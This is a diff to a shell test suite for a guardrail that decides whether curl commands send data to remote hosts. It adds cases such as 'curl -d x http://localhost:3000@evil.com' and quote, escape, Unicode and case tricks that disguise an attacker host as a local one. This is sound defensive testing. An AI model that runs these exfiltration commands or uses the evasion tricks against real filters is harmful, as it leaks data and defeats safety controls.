@@ -743,6 +743,46 @@ allows 'curl -d x "http://127.0.0.1":8080/x'       "a quote that closes a loopba
 blocks 'curl -d x "http://localhost":3000@evil.com' "a user before an @ is not the host"
 blocks 'curl -d x "http://127.0.0.1":3000@evil.com' "a loopback user before an @ is not the host"
 
+# A URL's host follows its userinfo, which ends at the last @ before the first /, ? or # (#149).
+blocks 'curl -d x http://localhost:3000@evil.com'        "a local name and port before an @"
+blocks 'curl -d x http://a.local@evil.com/x'             "a local name before an @"
+blocks 'curl -d x a.local@evil.com'                      "a local name before an @, with no scheme"
+blocks 'curl -d x http://u@localhost@evil.com'           "the host after the last @"
+blocks 'curl -d x http://evil.com?@localhost'            "an @ after a ? is in the query"
+blocks 'curl -d x http://evil.com#@localhost'            "an @ after a # is in the fragment"
+allows 'curl -d x http://user:pass@localhost:3000/api'   "credentials before a local host"
+allows 'curl -d x http://admin@127.0.0.1:5984/db'        "a user before a loopback address"
+allows 'curl -d x http://localhost/x@evil.com'           "an @ in the path"
+allows 'curl -d x http://localhost?x@evil.com'           "an @ in the query"
+allows 'curl -d x "http://user:pass@localhost:3000"'     "quoted credentials before a local host"
+
+# The shell drops a word's quotes before curl reads it, so quotes inside a URL hide no host (#148).
+blocks "curl -d x 'evil.com'"                            "a quoted remote host with no scheme"
+blocks 'curl -d x "http://e"vil.com/x'                   "a quote inside a remote host"
+blocks "curl -d x 'h'ttps://evil.com"                    "a quote inside the scheme"
+blocks 'curl -d x "http:"//evil.com'                     "a quote between the scheme and its slashes"
+blocks "curl -d x http://\$'evil.com'"                   "an ANSI-C quoted host"
+blocks 'curl -d x http://e\vil.com'                      "an escaped letter in a remote host"
+blocks "curl -d x \$'http://localhost\\x40evil.com'"     "an ANSI-C escape, which can make any character"
+blocks "curl -d x 'http://evil.com:1\\@localhost'"       "a quoted backslash, which some clients read as a slash"
+blocks 'curl -d x localhost.evil.com\\@localhost'        "an escaped backslash, which stays"
+blocks "curl -d x http:'//'[2001:db8::1]/x"              "a quote that splits the :// of a URL with no dot"
+blocks "curl -d x \$'evil\\x2ecom'"                      "an ANSI-C escape that makes the dot"
+allows 'curl -d x "http://local"host:3000/api'           "a quote inside a local host"
+allows 'curl -d x "http://localhost:3000/api/v1/projects/123/items?include=details&sort=desc"' "a long quoted local URL"
+allows 'curl -d "{\"name\":\"x.y\"}" http://localhost:3000/api' "escaped quotes in a body that holds no URL"
+# The shell splits words on ASCII blanks only, so a blank only Unicode has does not end a URL.
+utf8 _guardrails_has_remote_target $'curl -d x http://localhost\xe3\x80\x80@evil.com' || {
+  echo "  FAIL [a Unicode blank inside a URL]: not read as remote"; FAILS=1; }
+
+# curl reads a URL's scheme in any case.
+blocks 'curl -d x HTTP://evil.com'                        "an upper-case scheme"
+blocks 'curl -d x Https://evil.com/x'                     "a mixed-case scheme"
+blocks 'curl -d x HTTP://localhost:3000@evil.com'         "an upper-case scheme before userinfo"
+blocks 'curl -d x HTTP://127.attacker.example/'           "an upper-case scheme before a public name that starts with 127."
+allows 'curl -d x HTTP://localhost:3000/api'              "an upper-case scheme to a local host"
+allows 'curl -d x HTTPS://127.0.0.1:8080/x'               "an upper-case scheme to a loopback address"
+
 # A verb read from one piece of a quoted argument of several words asks, as the shell passes the argument whole. One
 # read from a whole quoted word blocks, as does one in the middle of a quoted argument, as before (#131).
 asks   'claude "review this"'                       "a verb from the first piece of a quoted argument"
